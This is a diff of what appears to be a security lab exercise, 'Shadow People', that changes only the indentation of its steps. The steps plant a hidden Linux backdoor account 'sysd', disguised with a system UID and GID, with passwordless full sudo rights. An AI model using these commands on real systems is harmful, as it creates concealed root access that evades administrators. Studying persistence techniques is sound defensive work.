@@ -3,27 +3,27 @@ Step 1: Shadow People
 
  1.  Create a secret user named sysd. Make sure this user doesn't have a home folder created:
 
-        root:~\ $ useradd --no-create-home sysd
+         root:~\ $ useradd --no-create-home sysd
 
  2.  Give your secret user a password:
         
-        root:~\ $ passwd sysd
+         root:~\ $ passwd sysd
 
  3.  Give your secret user a system UID < 1000:
 
-        root:~\ $ usermod -u 37 sysd
+         root:~\ $ usermod -u 37 sysd
 
  4.  Give your secret user the same GID:
 
-        root:~\ $ usermod -u 37 -g 37 sysd 
+         root:~\ $ usermod -u 37 -g 37 sysd 
 
  5.  Give your secret user full sudo access without the need for a password:
 
-        root:~\ $ visudo
+         root:~\ $ visudo
 
    #includedir /etc/sudoers.d
 
-        sysd ALL=(ALL) NOPASSWD:ALL
+         sysd ALL=(ALL) NOPASSWD:ALL
         
  6.  Test that sudo access works without your password: 
         
